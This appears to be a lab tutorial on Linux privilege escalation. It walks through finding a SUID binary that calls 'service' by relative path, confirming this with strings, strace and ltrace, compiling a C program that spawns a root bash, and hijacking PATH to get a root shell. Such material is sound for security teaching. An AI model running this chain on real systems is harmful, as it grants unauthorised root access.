FINDING VULNERABLE PROGRAMS

The PATH environment variable contains a list of directories where the shell should try to find programs.

If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found.

Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.

If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string.

We can run strings on the executable file to find strings of characters.

We can also use strace to see how the program is executing. Another program called ltrace may also be of use.

Running strings against a file:
```bash - target
strings /path/to/file
```

Running strace against a command:

```bash - target
strace -v -f -e execve <command> 2>&1 | grep exec
```

Running e ltrace against a command:

```bash - target
ltrace <command>
```

1. Find SUID/SGID files on the target:

```bash - target
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

-rwsr-sr-x 1 root staff 6883 May 14 2017 /usr/local/bin/suid-env

The suid-env file should execute with root user permissions.

2. Run strings on the SUID file:

```bash - target
strings /usr/local/bin/suid-env
```

/lib64/ld-linux-x86-64.so.2
service apache2 start

The file could be trying to run the service program without a full path.

3. We can verify this with strace:

```bash - target
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
```

[pid 14395] execve("/bin/sh", ["sh", "-c", "service apache2 start"],

4. Optionally, we can also verify with ltrace:

```bash - target
ltrace /usr/local/bin/suid-env 2>&1 | grep service
```

system("service apache2 start"

This reveals that the system function is being used to execute the service program.

5. Create a file service.c with the following contents:

==service.c==

---
```c - target

int main() {
 setuid(0);

 system("/bin/bash -p");
}
```
---

6. Compile service.c into a file called service:

```bash - target
gcc -o service service.c
```

7. Prepend the current directory (or where the new service executable is located) to the PATH variable, and execute the SUID file for a root shell:

```bash - target
PATH=.:$PATH /usr/local/bin/suid-env
```

```bash - target
id
```

> uid=0(root) gid=0(root) groups=0(root) ...